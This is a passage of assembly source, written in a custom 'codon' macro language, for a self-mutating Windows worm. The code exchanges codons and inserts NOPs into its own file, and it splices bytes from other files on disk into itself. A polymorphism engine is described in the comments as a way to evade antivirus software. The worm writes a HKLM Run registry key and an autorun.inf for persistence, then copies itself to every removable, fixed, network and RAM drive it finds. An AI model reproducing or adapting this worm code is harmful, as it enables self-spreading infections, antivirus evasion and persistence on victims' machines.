	_JnzDown		 ; if not zero, dont exchange codons
	    _nopsB		     ; restore
	    _writeDWord 	     ; save mutation!
	    _nopREAL
	    _nopREAL



	CalcNewRandNumberAndSaveIt


	_pop
	addnumber 1
	_nopdB			 ; inc counter

	GetAddress MapPointer
	_getdata
	_save
	_zer0 1

	GetAddress FileSize
	_getdata

	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_sub0001     ; Dont mutate the last 9 bytes because of xchg problems

	_addsaved
	_save			 ; mov save, [MapPointer]+GenomEndInMap

	_nopsB
	_subsaved 0		; cmp counter, [MapPointer]+GenomEndInMap
	_JnzUp			 ; jnz esi
; loop ANextByteInChain

; ##### Finished codons exchange
; ############################################################################


; ############################################################################
; ##### Start of NOP Insertion
;
; nBeforeIns = rand() % FileSize
; nBlockSize = (rand() % 32) + 1
; nByteBlockToMov = (rand() % (FileSize-nBeforeIns)) + 1
;
; InsStart       = MapPoint + nBeforeIns
; BlockEndBefore = MapPoint + nBeforeIns + nByteBlockToMov
; InsEnd         = MapPoint + nBeforeIns + nBlockSize
; BlockEndAfter  = MapPoint + nBeforeIns + nBlockSize + nByteBlockToMov
;
;    File before NOP Insertion:                File after NOP Insertion:
;
;    | ---------------- MapPoint               | ---------------- MapPoint
;    | \                                       | \
;    |  \                                      |  \
;    |   > nBeforeIns                          |   > nBeforeIns
;    |  /                                      |  /
;    | /                                       | /
;    | --------------- InsStart                | --------------- InsStart
;    | \                                       | \                   ; _nopREAL
;    |  \                                      |  > nBlockSize       ; _nopREAL
;    |   \                                     | /                   ; _nopREAL
;    |    > nByteBlockToMov                    | --------------- InsEnd
;    |   /                                     | \
;    |  /                                      |  \
;    | /                                       |   \
;    | --------------- BlockEndBefore          |    > nByteBlockToMov
;    |                                         |   /
;    |                                         |  /
;    |                                         | /
;    |                                         | --------------- BlockEndAfter
;    |                                         |
;    |    Rest of file                         |
;    |                                         |
;    |                                         |   Rest of file*
;    |                                         |
;    |                                         |
;    | ----------------                        | ----------------
;
;    In PseudoCode:
;    ==============
;
;    c=nByteBlockToMov;
;    do
;        *(InsEnd+c)==*(InsStart+c)
;    while --c
;
;    c=nBlockSize;
;    do
;        *(InsStart+c)==_nopREAL
;    while --c
;
;
;
	GetAddress RandomNumber

	_getdata
	_nopdA
	_zer0 0
	_nopdD

	addnumber InsertThreshold1

	_div
	_nopsD

	_push		     ; Save Result = (rand() % InsertThreshold1)

	CalcNewRandNumberAndSaveIt





	GetAddress RandomNumber 		; -> nBeforeIns = rand() % FileSize
	_getdata
	_nopdA				     ; mov RegA, [RandomNumber]

	_zer0 0
	_nopdD				     ; mov RegD, 0

	GetAddress FileSize
	_getdata
	_nopdB				     ; RegB=FileSize

	_div				     ; div BC1 <- RegD = rand() % FileSize = nBeforeIns

	GetAddress InsStart
	_saveWrtOff

	_nopsD				     ; BC1=nBeforeIns
	_save				     ; BC2=nBeforeIns

	_nopsB				     ; BC1=FileSize
	_subsaved 1			    ; BC1=(FileSize-nBeforeIns)
	_nopdB				     ; RegB=(FileSize-nBeforeIns)

	GetAddress MapPointer
	_getdata			     ; BC1=MapPoint
	_addsaved			     ; BC1=MapPoint + nBeforeIns = InsStart

	_writeDWord			     ; !!! InsStart=MapPoint + nBeforeIns
	_push



	CalcNewRandNumberAndSaveIt		; -> nBlockSize = rand() % 32

	GetAddress nBlockSize
	_saveWrtOff

	GetAddress RandomNumber
	_getdata
	_nopdA				     ; mov RegA, [RandomNumber]

	_zer0 0
	_nopdD				     ; mov RegD, 0
	addnumber 32

	_div				     ; div BC1 <- RegD = rand() % 32 = nBlockSize



	_nopsD				     ; BC1=nBlockSize
	addnumber 1
	_writeDWord			     ; !!! nBlockSize

	_save				     ; BC2=nBlockSize

	GetAddress InsEnd
	_saveWrtOff

	_pop				     ; BC1 = InsStart
	_addsaved			     ; BC1 = InsStart + nBlockSize = InsEnd

	_writeDWord			     ; !!! InsEnd



	CalcNewRandNumberAndSaveIt		; -> nByteBlockToMov = rand() % (FileSize-nBeforeIns)

	GetAddress nByteBlockToMov
	_saveWrtOff

	GetAddress RandomNumber
	_getdata
	_nopdA				     ; mov RegA, [RandomNumber]

	_zer0 0
	_nopdD				     ; mov RegD, 0

	_nopsB				     ; BC1=(FileSize-nBeforeIns)

	_div

	_nopsD				     ; BC1=nByteBlockToMov
	addnumber 1
	_writeDWord			     ; !!! nByteBlockToMov

;;;;;;;;;;;;;;;;;;;;;;;
;    c=nByteBlockToMov;
;    do
;        *(InsEnd+c)==*(InsStart+c)
;    while --c

	GetAddress InsStart
	_getdata
	_nopdA		     ; RegA=InsStart

	GetAddress InsEnd
	_getdata
	_nopdB		     ; RegB=InsEnd

	GetAddress nByteBlockToMov
	_getdata
	_nopdD		     ; RegD=nByteBlockToMov=c

; do
	_getEIP
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_saveJmpOff	     ; mov BA2, eip

	_nopsD		     ; BC1=c
	_save		     ; BC2=c

	_nopsB		     ; BC1=InsEnd
	_addsaved	     ; BC1=InsEnd+c
	_saveWrtOff	     ; BA1=InsEnd+c


	_pop		     ; If BC1=0: mutate
	_push
	addnumber 1
	_sub0001	     ; Get the zer0 flag
	_JnzDown
		_nopsA		     ; BC1=InsStart
		_addsaved	     ; BC1=InsStart+c
		_getdata	     ; BC1=*(InsStart+c)
		_writeByte	     ; *(InsEnd+c)==*(InsStart+c)

	_nopsD
	_sub0001
	_nopdD		     ; RegD=c-1

	_JnzUp
; while --c

;;;;;;;;;;;;;;;;;;;;;;;
;    c=nBlockSize;
;    do
;        *(InsStart+c)==_nopREAL
;    while --c

; Already set:
;        GetAddress InsStart
;        _getdata
;        _nopdA               ; RegA=InsStart

	_zer0 0
	addnumber 144
	_nopdB

	GetAddress nBlockSize
	_getdata
	_nopdD		     ; RegD=nBlockSize=c


; do
	_getEIP
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_saveJmpOff	     ; mov BA2, eip

	_nopsD		     ; BC1=c
	_save		     ; BC2=c

	_nopsA		     ; BC1=InsStart
	_addsaved	     ; BC1=InsStart+c
	_saveWrtOff	     ; BA1=InsStart+c



	_pop		     ; If BC1=0: mutate
	_push
	addnumber 1
	_sub0001	     ; Get the zer0 flag
	_JnzDown
		_nopREAL
		_nopREAL
		_nopsB
		_writeByte	     ; *(InsStart+c)==_nopREAL

	_nopsD
	_sub0001
	_nopdD		     ; RegD=c-1

	_JnzUp
; while --c

	_pop	     ; remove (rand() % InsertThreshold1) from Stack


; ##### End of Insertion
; ############################################################################


;        _int3

; ############################################################################
; ##### Start of horizontal gene transfer

	_zer0 0 		       ; BC1=0
	addnumber ((HGTEnd1-HGTStart1)*8)  ; size of block

	_save


	_getEIP

     HGTStart1:
	addnumber 3
	_addsaved
	_nopdB				     ; Save Addresse in RegB


	CalcNewRandNumberAndSaveIt		; -> HGTThreshold1

	GetAddress RandomNumber
	_getdata
	_nopdA				     ; mov RegA, [RandomNumber]

	_zer0 0
	_nopdD				     ; mov RegD, 0
	addnumber HGTThreshold1

	_div				     ; div BC1 <- RegD = rand() % HGTThreshold1

	_nopsD
	_save
	_and				     ; Is zero?

	_JnzDown			     ; Simulate a JzDown

		_nopREAL     ; BC1=0
		_nopREAL
		_add0001
		_JnzDown


			_nopsB	   ; BC1!=0
			_call	   ; jmp over HGT
			_nopREAL
			_nopREAL


	GetAddress HGT_searchmask
	_saveWrtOff
	_zer0 0
	addnumber 0x002A2E2A
	_writeDWord


	GetAddress WIN32_FIND_DATA_struct
	_push
	GetAddress HGT_searchmask
	_push
	CallAPI hFindFirstFileA


	GetAddress HGT_FFHandle
	_saveWrtOff
	_nopsA
	_writeDWord		      ; Save FindHandle

	_getEIP
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_saveJmpOff	     ; Start of the loop


		; Calculate the call addresse if the file is not ok
		_zer0 0
		addnumber ((HGTFileEnd1-HGTFileStart1)*8)
		_save

		_getEIP

	 HGTFileStart1:
		addnumber 3
		_addsaved
		_push				     ; Save Addresse on Stack

		GetAddress HGTFileHandle		; Handle to zero because it will
							; be Closed later in any case,
							; except for [Handle]==0x0
		_saveWrtOff
		_zer0 0
		_writeDWord

		GetAddress HGTMapHandle
		_saveWrtOff
		_zer0 0
		_writeDWord

		GetAddress HGTDidInsert
		_saveWrtOff
		_zer0 0
		_sub0001
		_writeDWord

		_zer0 0 			       ; Is it a directory?
		addnumber FILE_ATTRIBUTE_DIRECTORY
		_save
		GetAddress WIN32_FIND_DATA_dwFileAttributes
		_getdata
		_subsaved 0

		_JnzDown			     ; Simulate a JzDown
			_pop	 ; BC1=0
			_push
			_call	 ; If directory -> Do not open...
			_nopREAL


		CalcNewRandNumberAndSaveIt

		GetAddress RandomNumber
		_getdata
		_nopdA

		_zer0 0
		_nopdD

		addnumber 5
		_div

		_nopsD
		_save
		_and

		_JnzDown			     ; Simulate a JzDown

			_nopREAL   ; BC=0
			_nopREAL
			_add0001
			_JnzDown

				_pop	 ; BC!=0
				_push
				_call	 ; Not this file...
				_nopREAL


		; OPEN FILE NOW
		_zer0 0
		_push
		_push
		addnumber 3
		_push
		_zer0 0
		_push
		addnumber 1
		_push
		_sub0001
		addnumber 0xC0000000
		_push
		GetAddress WIN32_FIND_DATA_cFileName
		_push
		CallAPI hCreateFileA

		GetAddress HGTFileHandle
		_saveWrtOff
		_nopsA
		_writeDWord		 ; mov dword[HGTFileHandle], RegA

		_save

		_nopsA
		addnumber 1		; INVALID_HANDLE_VALUE=-1
					; -> if error: BC1=0

		_JnzDown			     ; Simulate a JzDown
			_pop	 ; BC1=0
			_push
			_call	 ; If INVALID_HANDLE_VALUE -> Do not open...
			_nopREAL

		GetAddress HGTFileSize

		_push
		_zer0 1
		_addsaved
		_push
		CallAPI hGetFileSize

		GetAddress HGTFileSize
		_saveWrtOff
		_nopsA
		_writeDWord		 ; mov dword[HGTFileSize], RegA

		_zer0 1
		_push
		_addsaved
		_push
		_zer0 0
		_push
		addnumber 4
		_push
		_zer0 0
		_push
		GetAddress HGTFileHandle
		_getdata
		_push
		CallAPI hCreateFileMappingA


		GetAddress HGTMapHandle

		_saveWrtOff
		_nopsA
		_writeDWord		  ; mov dword[HGTMapHandle], RegA

		_save

		_nopsA
		_save
		_and
		_JnzDown			     ; Simulate a JzDown

			_pop	 ; BC1=0
			_push
			_call	 ; If NULL -> Do not open...
			_nopREAL

		GetAddress HGTFileSize

		_getdata
		_push	; [HGTFileSize]
		_zer0 1
		_push	; 0
		_push	; 0
		addnumber 2
		_push
		_zer0 1
		_addsaved
		_push	; MapHandle

		CallAPI hMapViewOfFile

		GetAddress HGTMapPointer

		_saveWrtOff
		_nopsA
		_writeDWord		 ; mov dword[HGTMapPointer], RegA

		_nopsA
		_save
		_and
		_JnzDown	 ; Simulate a JzDown
			_pop	 ; BC1=0
			_push
			_call	 ; If NULL -> Do not open...
			_nopREAL


		CalcNewRandNumberAndSaveIt

		GetAddress RandomNumber
		_getdata
		_nopdA

		_zer0 0
		_nopdD

		GetAddress HGTFileSize
		_getdata

		_div

		_nopsD
		_save

		GetAddress HGTMapPointer
		_getdata

		_addsaved

		_push		     ; Start in sourcefile


		CalcNewRandNumberAndSaveIt

		GetAddress RandomNumber
		_getdata
		_nopdA

		_zer0 0
		_nopdD

		GetAddress FileSize
		_getdata

		_div

		_nopsD
		_save

		GetAddress MapPointer
		_getdata
		_addsaved

		_push		     ; Start in my file


		CalcNewRandNumberAndSaveIt

		GetAddress RandomNumber
		_getdata
		_nopdA

		_zer0 0
		_nopdD

		addnumber 11

		_div
		_nopsD
		addnumber 1
		_nopdD

		; Size in RegD


		_pop	     ; Start in my file
		_nopdB


		_pop	     ; Start in victim file
		_nopdA

		_pushall
		_getEIP
		_sub0001
		_sub0001
		_sub0001
		_sub0001
		_sub0001

		_saveJmpOff	     ; Save everything, especially the old BA2

			_nopsB
			_saveWrtOff
			addnumber 1
			_nopdB

			_nopsA
			addnumber 1
			_nopdA
			_sub0001
			_getdata

			_writeByte

			_nopsD
			_sub0001
			_nopdD

		_JnzUp
		_popall 	     ; Get old BA2 again

		GetAddress HGTDidInsert 	; 0=already written
		_saveWrtOff
		_zer0 0
		_writeDWord


		_push	     ; trash

	 HGTFileEnd1:
		_pop	     ; from call
		_pop	     ; saved address

		GetAddress HGTMapPointer
		_getdata
		_push
		CallAPI hUnmapViewOfFile	; call UnmapViewOfFile, dword[HGTMapPointer]


		_getDO
		addnumber (hCloseHandle-DataOffset)
		_getdata
		_nopdA	     ; Save API in RegA

		GetAddress HGTMapHandle
		_getdata
		_push
		_save
		_and

		_JnzDown
		   ; BC==0
		   _nopREAL
		   _nopREAL
		   _add0001
		   _JnzDown

			; BC!=0
			_nopsA	     ; get API offset
			_call	     ; call CloseHandle, dword[HGTMapHandle]
			_push	     ; Trash
			_nopREAL


		_pop	     ; remove trash

		_getDO
		addnumber (hCloseHandle-DataOffset)
		_getdata
		_nopdA	     ; Save API in RegA

		GetAddress HGTFileHandle
		_getdata
		_push
		_save
		_and

		_JnzDown
		   ; BC==0
		   _nopREAL
		   _nopREAL
		   _add0001
		   _JnzDown

			; BC!=0
			_nopsA	     ; get API offset
			_call	     ; call CloseHandle, dword[HGTFileHandle]
			_push	     ; Trash
			_nopREAL

		_pop	     ; remove trash


		GetAddress HGTDidInsert
		_getdata
		_push		     ; 0...written / -1...not written

		GetAddress WIN32_FIND_DATA_struct
		_push
		GetAddress HGT_FFHandle
		_getdata
		_push

		CallAPI hFindNextFileA


		_pop			 ; HGTDidInsert
		_save
		_nopsA			 ; If nonzero: Next file!
	_and
	_JnzUp				 ; End of the loop


	_push		     ; Trash to stack
	HGTEnd1:

	_pop		     ; Align stack (Trash or Return address from _call)

; ##### End of horizontal gene transfer
; ############################################################################

; #####
; #####
; ############################################################################
; ############################################################################

;      _int3    ; WORKS HERE


; ############################################################################
; ############################################################################
; #####
; #####  Here we find polymorphism
; #####
;
;  Together with natural mutations, also a special form of polymorphism
;  can be performed.
;
;  To achieve robustness under bitflip mutations, the alphabeth is
;  constructed to be redundant (about 35 commands are coded within 256
;  slots).
;
;  This redundancy will be used in the polymorphism. The code searchs the
;  alphabeth for equal entries. If it finds two amino acids A and B, which
;  are equal, then in the codesection there will be a random flip from
;  codon A to codon B.
;
;  There are some reasons why a mutation-system like this should be included:
;  1) The variability of the worm is much faster
;  2) Codons which point to isolated amino acids (these who can not be
;     transformed by a single bitflip to another amino acid of the same kind)
;     can be de-isolated.
;  3) Mutations in the polymorphism-engine could lead to unexpected
;     (non-lethal) results.
;  4) Macro-Mutations are of high importance to bypass natural enemies
;     (like antivirus software), thus increase fitness.
;  5) Could make some variations in START and STOP codons, which have
;     unpredictable results.
;
	CalcNewRandNumberAndSaveIt

	GetAddress RPAminoAcid1
	_saveWrtOff

	GetAddress RandomNumber

	_getdata
	_nopdA			 ; mov eax, [RandomNumber]


	_zer0 0
	_nopdD			 ; mov edx, 0

	addnumber 256

	_div			 ; div ebx

	_nopsD			 ; BC1=rand%256

	_writeDWord		 ; Save amino acid to compare.


	_push
	_zer0 0
	addnumber 3
	_save

	_pop
	_shl			 ; BC1=(rand%256)*8
	_save


	GetAddress MapPointer
	_getdata
	_addsaved		 ; MapPoint+(rand%256)*8

	addnumber (CodeStart+(StartAlphabeth-start))  ; MapPoint+(rand%256)*8+AlphabethStart
	_push
	_getdata
	_nopdA			 ; First 4 bytes of amino acid in RegA

	_pop
	addnumber 4
	_getdata
	_nopdB			 ; 2nd 4 bytes of amino acid in RegB

	GetAddress MapPointer
	_getdata

	addnumber (CodeStart+(StartAlphabeth-start))
	_nopdD


    ; Start of loop:
	_getEIP
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_saveJmpOff

		_zer0 0 		       ; BC1=0
		addnumber ((RPBlock1End1-RPBlock1Start1)*8)   ; size of block
		_save

		_getEIP

	    RPBlock1Start1:
		addnumber 3
		_addsaved
		_push				    ; Save Addresse at Stack


		_pushall
			CalcNewRandNumberAndSaveIt

			GetAddress RPAminoAcid2
			_saveWrtOff

			GetAddress RandomNumber

			_getdata
			_nopdA			 ; mov eax, [RandomNumber]

			_zer0 0
			_nopdD			 ; mov edx, 0

			addnumber 256

			_div			 ; div ebx

			_nopsD
			_writeDWord

		_popall

		_pushall
		   GetAddress RPAminoAcid1
		   _getdata
		   _nopdA
		   GetAddress RPAminoAcid2
		   _getdata
		   _nopdB

		_popall

		_zer0 0
		addnumber 3
		_save

		GetAddress RPAminoAcid2
		_getdata

		_shl	     ; *8
		_save

		_nopsD	      ; Get start of Alphabeth in Map

		_addsaved

		_getdata
		_save

		_nopsA
		_subsaved 0

		_JnzDown     ; Simulate JzDown

			_nopREAL     ; BC1=0
			_nopREAL
			_add0001
			_JnzDown

				_nopREAL     ; Not equal
				_pop
				_push
				_call	     ; jmp to RPBlock1End

	; First 4 bytes are equal
		_pop	     ; Old Call-address

		_zer0 0        ; BC1=0
		addnumber ((RPBlock2End1-RPBlock2Start1)*8)   ; size of block
		_save

		_getEIP

	    RPBlock2Start1:
		addnumber 3
		_addsaved
		_push				    ; Save Addresse at Stack


		_zer0 0
		addnumber 3
		_save

		GetAddress RPAminoAcid2
		_getdata

		_shl	     ; *8
		_save

		_nopsD	      ; Get start of Alphabeth in Map

		_addsaved

		addnumber 4	 ; Get second 4 bytes

		_getdata
		_save

		_nopsB	     ; second 4 bytes
		_subsaved 0
		_JnzDown

			_nopREAL     ; BC1=0
			_pop
			_push
			_call	     ; RPBlock2End

		_push	     ; not equal! trash to stack

	    RPBlock1End1:	 ; Not equal amino acids
		_pop	     ; remove "call"-return address
		_pop	     ; RPBlock1End-Jmp Address

		_zer0 0
		addnumber 15
		_save

		GetAddress RandomNumber
		_getdata     ; BC1=random

		_shr	     ; BC1=random >> 15 (to get new small random number without calling the 32bit RND engine again)
		_and	     ; BC1=(random >> 15) % 0000 1111b
	_JnzUp		     ; If not zero -> Next loop!


	; Not found any equivalences...

	_zer0 0 		       ; BC1=0
	addnumber ((RPBlock3End1-RPBlock3Start1)*8)   ; size of block
	_save

	_getEIP

     RPBlock3Start1:
	addnumber 3
	_addsaved

	_call	     ; jmp to end of poly-engine: RPBlock3End




     RPBlock2End1:	 ; Equal amino acids found
	_pop	     ; remove "call"-return address
	_pop	     ; RPBlock2End-Jmp Address


	GetAddress MapPointer
	_getdata

	addnumber (CodeStart+(StAmino-start))  ; MapPoint+(rand%256)*8+CodonStart
	_nopdD

	GetAddress RPAminoAcid1
	_getdata
	_nopdA

	GetAddress RPAminoAcid2
	_getdata
	_nopdB

	_zer0 0
	GetAddress FileSize
	_getdata
	addnumber (0xFFFF'FFFF-(CodeStart+(StAmino-start))-1000)	  ; Approximativly...
	_push

	_getEIP
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_saveJmpOff

		_nopsD	     ; Codon-Sequence Start
		_save

		_pop
		_push	     ; counter

		_addsaved
		_saveWrtOff
		_getdata
		_push

		_zer0 0
		addnumber 255
		_save
		_pop
		_and	     ; BC1=one byte
		_save

		_nopsA

		_subsaved 0    ; is equal?
		_JnzDown
			_nopsB
			_writeByte	     ; If equal: exchange codon!
			_nopREAL
			_nopREAL

		_pushall
			CalcNewRandNumberAndSaveIt
		_popall

		_zer0 0
		addnumber 1
		_save

		GetAddress RandomNumber
		_getdata
		_and
		addnumber 1
		_save		     ; BC2=(rand%8)+1

		_pop
		_subsaved 0	       ; counter-=((rand%8)+1)
		_push

		_zer0 0
		addnumber 4293918720	; BC1=0xFFF0 0000
		_save
		_pop
		_push
		_and		     ; BC1=(counter%0xFFF0 0000)

		_JnzDown
			_add0001  ; Not finished
			_JnzUp	     ; Next step
			_nopREAL
			_nopREAL


	_pop	     ; counter away from stack
	_push	     ; trash

     RPBlock3End1:
	_pop	     ; return value from call


; #####
; #####
; ############################################################################
; ############################################################################

	GetAddress MapPointer
	_getdata
	_push
	CallAPI hUnmapViewOfFile	; call UnmapViewOfFile, dword[MapPointer]

	GetAddress MapHandle
	_getdata
	_push
	CallAPI hCloseHandle		; call CloseHandle, dword[MapHandle]

	GetAddress FileHandle
	_getdata
	_push
	CallAPI hCloseHandle		; call CloseHandle, dword[FileHandle]


; ############################################################################
; ##### Create Registry Key

	GetAddress AutoStartContentStart
	_saveWrtOff
	_nopdA

	GetAddress stSubKey			; Create the key in the data section
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber 'SOFT'
	_writeDWord

	_nopsA
	addnumber 4
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber 'WARE'
	_writeDWord

	_nopsA
	addnumber 4
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber '\Mic'
	_writeDWord

	_nopsA
	addnumber 4
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber 'roso'
	_writeDWord

	_nopsA
	addnumber 4
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber 'ft\W'
	_writeDWord

	_nopsA
	addnumber 4
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber 'indo'
	_writeDWord

	_nopsA
	addnumber 4
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber 'ws\C'
	_writeDWord

	_nopsA
	addnumber 4
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber 'urre'
	_writeDWord

	_nopsA
	addnumber 4
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber 'ntVe'
	_writeDWord

	_nopsA
	addnumber 4
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber 'rsio'
	_writeDWord

	_nopsA
	addnumber 4
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber 'n\Ru'
	_writeDWord

	_nopsA
	addnumber 4
	_saveWrtOff
	_zer0 0
	addnumber 'n'
	_writeDWord


	GetAddress hRegKey
	_push
	GetAddress stSubKey
	_push
	_zer0 0
	addnumber HKEY_LOCAL_MACHINE
	_push
	CallAPI hRegCreateKeyA

	_zer0 0
	addnumber 15
	_push		     ; 15
	GetAddress Driveletter3
	_push		     ; C:\evolusss.exe
	_zer0 0
	addnumber REG_SZ
	_push		     ; REG_SZ
	_zer0 0
	_push		     ; 0x0
	_push		     ; 0x0
	GetAddress hRegKey
	_getdata
	_push		     ; dword[hRegKey]
	CallAPI hRegSetValueExA

; ##### End Create Registry Key
; ############################################################################





; ############################################################################
; ##### Create Autostart file   (For older and unpatched systems)

	GetAddress AutoStartContentStart
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber '[Aut'
	_writeDWord

	_nopsA
	addnumber 4
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber 'orun'
	_writeDWord

	_nopsA
	addnumber 4
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber 0x530A0D5D	; ']', 0x0D, 0x0A, 'S'
	_writeDWord

	_nopsA
	addnumber 4
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber 'hell'    ; huh - nice ;)
	_writeDWord

	_nopsA
	addnumber 4
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber 'Exec'
	_writeDWord

	_nopsA
	addnumber 4
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber 'ute='
	_writeDWord

	_nopsA
	addnumber 4
	_nopdA
	_saveWrtOff
	GetAddress RandomFileName
	_nopdB
	_getdata
	_writeDWord

	_nopsA
	addnumber 4
	_nopdA
	_saveWrtOff
	_nopsB
	addnumber 4
	_getdata
	_writeDWord

	_nopsA
	addnumber 4
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber '.exe'
	_writeDWord

	_nopsA
	addnumber 4
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber 0x73550A0D
	_writeDWord

	_nopsA
	addnumber 4
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber 'eAut'
	_writeDWord

	_nopsA
	addnumber 4
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber 'opla'
	_writeDWord

	_nopsA
	addnumber 3
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber 'ay=1'
	_writeDWord

	GetAddress autoruninf
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber 'auto'
	_writeDWord

	_nopsA
	addnumber 4
	_nopdA
	_saveWrtOff
	_zer0 0
	addnumber 'run.'
	_writeDWord

	_nopsA
	addnumber 3
	_saveWrtOff
	_zer0 0
	addnumber '.inf'
	_writeDWord

	_zer0 0
	_push		     ; 0x0
	addnumber 2
	_push		     ; 0x2
	_zer0 0
	addnumber CREATE_ALWAYS
	_push		     ; CREATE_ALWAYS
	_zer0 0
	_push		     ; 0x0
	_push		     ; 0x0
	addnumber 0xC0000000
	_push		     ; 0xC0000000
	GetAddress autoruninf
	_push		     ; autoruninf
	CallAPI hCreateFileA

	GetAddress FileHandle
	_saveWrtOff
	_nopsA
	_writeDWord	      ; dword[FileHandle]=eax

	_zer0 0
	_push		      ; 0x0
	GetAddress MapHandle
	_push		      ; Trash-Address
	_zer0 0
	addnumber (AutoStartContentEnd-AutoStartContentStart)
	_push		      ; Size of Buffer
	GetAddress AutoStartContentStart
	_push		      ; Buffer to write
	GetAddress FileHandle
	_getdata
	_push		      ; FileHandle
	CallAPI hWriteFile

	GetAddress FileHandle
	_getdata
	_push
	CallAPI hCloseHandle

; ##### Create Autostart file
; ############################################################################


; ############################################################################
; ############################################################################
; ############################################################################
; #####
; ##### Main Loop (Searchs for Drives, and copies itself)
; #####


	_getEIP
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_sub0001
	_saveJmpOff		     ; Loop over Drive Letter A-Z

	_pushall
		_zer0 0
		_nopdB			     ; RegB=0
	
		GetAddress Driveletter1-1
		_saveWrtOff
		_zer0 0
		addnumber 0x003A4100		 ; 0x0, "A:", 0x0
		_writeDWord
	
		GetAddress Driveletter2-1
		_saveWrtOff
		_zer0 0
		addnumber 0x5C3A4100		 ; 0x0, "A:\"
		_writeDWord
	
	
		_zer0 0
		addnumber 26
		_nopdA			     ; counter
	
		_getEIP
		_sub0001
		_sub0001
		_sub0001
		_sub0001
		_sub0001
		_saveJmpOff		     ; Loop over Drive Letter A-Z

		_pushall
	
			GetAddress Driveletter1+2
			_saveWrtOff
			_zer0 1
			_writeByte

			GetAddress Driveletter1
			_push
			CallAPI hGetDriveTypeA

			_nopsA
			_save	     ; save Drive type

			_zer0 1
			addnumber 0x0010
			_push

			_zer0 1
			addnumber 2	; BC1=2
			_subsaved 1
			_JnzDown     ; Is DRIVE_REMOVABLE?
			    _pop      ; Stack=0x0010
			    _push
			    _nopdB    ; RegB=0x0010 -> FILE+AUTOSTART
			    _nopREAL

			_pop		; Trash away

			_zer0 1
			addnumber 0x0040
			_push

			_zer0 1
			addnumber 3	; BC1=3
			_subsaved 1
			_JnzDown	; Is DRIVE_FIXED?
			    _pop
			    _push	; RegB=0x0040 -> FILE
			    _nopdB
			    _nopREAL

			_pop		; Trash away

			_zer0 1
			addnumber 0x0010
			_push

			_zer0 1
			addnumber 4	; BC1=4
			_subsaved 1
			_JnzDown	; Is DRIVE_REMOTE?
			    _pop
			    _push	; RegB=0x0010 -> FILE+AUTOSTART
			    _nopdB
			    _nopREAL


			_zer0 1
			addnumber 6	; BC1=6
			_subsaved 1
			_JnzDown	; Is DRIVE_RAMDISK?
			    _pop
			    _push	; RegB=0x0010 -> FILE+AUTOSTART
			    _nopdB
			    _nopREAL

			_pop		; Trash away

		; ############################################################################
		; ##### Copy autorun.inf (or not)
	
			GetAddress autoruninf
			_nopdA		     ; address to "autorun.inf" to RegA
			GetAddress Driveletter2
			_nopdD		     ; address to "?:\autorun.inf" to RegD
	
			_nopsB
			_save
	
	
			_zer0 1
			addnumber 0x0010	; (FILE+AUTOSTART)
			_subsaved 1
			_JnzDown
			    _nopREAL		 ; BC1=0x0
			    _push		 ; bFailIfExists=FALSE
			    _nopsD
			    _push		 ; lpNewFileName="?:\autorun.inf"
		
		
			GetAddress hCopyFileA
			_getdata
			_nopdD
	
			_zer0 1
			addnumber 0x0010	; (FILE+AUTOSTART)
			_subsaved 1
			_JnzDown
			    _nopsA
			    _push		 ; lpExistingFileName="autorun.inf"
			    _nopsD
			    _call		 ; stdcall dword[hCopyFileA]
	

			_nopsB
			_save		     ; restore BC2 (=RegB)

			_zer0 1
			addnumber 0x0040
			_push

			_zer0 1
			addnumber 0x0010	; (FILE+AUTOSTART)
			_subsaved 1
			_JnzDown
			    _pop
			    _push
			    _nopdB
			    _save	      ; also copy child executable

			_pop		; Trash away

		
		; ##### End Copy autorun.inf (or not)
		; ############################################################################


		; ############################################################################
		; ##### Copy child executable (or not)
		
			GetAddress Driveletter1+2
			_saveWrtOff
			_zer0 1
			addnumber 0x5C		   ;'\'
			_writeByte
		
			GetAddress RandomFileName
			_nopdA		     ; address to "NNNNNNNN.exe" to RegA
			GetAddress Driveletter1
			_nopdD		     ; address to "?:\NNNNNNNN.exe" to RegD
		
			_nopsB
			_save
		
			_zer0 1
			addnumber 0x0040	; (FILE+AUTOSTART)
			_subsaved 1
			_JnzDown
			    _nopREAL
			    _push		 ; bFailIfExists=FALSE
			    _nopsD
			    _push		 ; lpNewFileName="?:\NNNNNNNN.exe"
		
		
			GetAddress hCopyFileA
			_getdata
			_nopdD
		
			_zer0 1
			addnumber 0x0040	; (FILE+AUTOSTART)
			_subsaved 1
			_JnzDown
			    _nopsA
			    _push		 ; lpExistingFileName="NNNNNNNN.exe"
			    _nopsD
			    _call		 ; stdcall dword[hCopyFileA]

		; ##### End Copy child executable (or not)
		; ############################################################################

		_popall
	
		GetAddress Driveletter1
		_saveWrtOff
		_getdata
		addnumber 1
		_writeByte
	
		GetAddress Driveletter2
		_saveWrtOff
		_getdata
		addnumber 1
		_writeByte
	
	
		_nopsA
